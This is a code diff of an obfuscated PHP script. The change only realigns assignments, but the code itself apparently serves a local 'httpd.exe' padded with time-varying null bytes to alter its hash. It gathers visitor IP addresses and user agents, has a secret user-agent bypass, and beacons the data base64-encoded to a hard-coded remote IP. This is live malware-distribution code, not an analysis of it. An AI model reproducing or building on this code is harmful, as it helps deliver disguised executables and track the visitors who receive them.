@@ -19,24 +19,24 @@ function getRealIpAddr()
 }$q4 = true;
 if (strpos($_SERVER['HTTP_USER_AGENT'], '5rrMiR6A2BmRK8z6hf245abd7KcX2NP5') !== false) {
     $q4 = false;
-}$u5 = [];
-$u5['time'] = date('c');
-$u5['ip'] = getRealIpAddr();
-$u5['user'] = $_SERVER['HTTP_USER_AGENT'];
-$u5['res'] = $_SERVER['SERVER_NAME'];
-$u5['need_log'] = $q4;
-$u5['ip_smarta'] = $_GET['ip_smarta'];
-$u5['UA-CPU'] = (string) $s2['UA-CPU'];
+}$u5                   = [];
+$u5['time']            = date('c');
+$u5['ip']              = getRealIpAddr();
+$u5['user']            = $_SERVER['HTTP_USER_AGENT'];
+$u5['res']             = $_SERVER['SERVER_NAME'];
+$u5['need_log']        = $q4;
+$u5['ip_smarta']       = $_GET['ip_smarta'];
+$u5['UA-CPU']          = (string) $s2['UA-CPU'];
 $u5['Accept-Encoding'] = (string) $s2['Accept-Encoding'];
-$a6 = filesize(__DIR__ . '/httpd.exe');
-$e7 = @file_get_contents(__DIR__ . '/httpd.exe');
+$a6                    = filesize(__DIR__ . '/httpd.exe');
+$e7                    = @file_get_contents(__DIR__ . '/httpd.exe');
 if ($_GET['nona'] != 'nona') {
     $i8 = time() % 3600;
     for ($w9 = 0; $w9 < $i8; $w9++) {
         $e7 .= "\0\0\0\0\0\0\0\0\0";
     }
 }$m10 = strlen($e7);
-$y11 = ['http://176.121.14.140/kvs.php?e=' . base64_encode(json_encode($u5)) . '&v=aladinio&fz=' . $a6 . '&aliman=' . $_GET['aliman'], 'http://176.121.14.140/kvs.php?e=' . base64_encode(json_encode($u5)) . '&v=aladinio&fz=' . $a6 . '&aliman=' . $_GET['aliman'], 'http://176.121.14.140/kvs.php?e=' . base64_encode(json_encode($u5)) . '&v=aladinio&fz=' . $a6 . '&aliman=' . $_GET['aliman']];
+$y11  = ['http://176.121.14.140/kvs.php?e=' . base64_encode(json_encode($u5)) . '&v=aladinio&fz=' . $a6 . '&aliman=' . $_GET['aliman'], 'http://176.121.14.140/kvs.php?e=' . base64_encode(json_encode($u5)) . '&v=aladinio&fz=' . $a6 . '&aliman=' . $_GET['aliman'], 'http://176.121.14.140/kvs.php?e=' . base64_encode(json_encode($u5)) . '&v=aladinio&fz=' . $a6 . '&aliman=' . $_GET['aliman']];
 shuffle($y11);
 $w12 = __DIR__ . '/download_big__stat.txt';
 @unlink($w12);
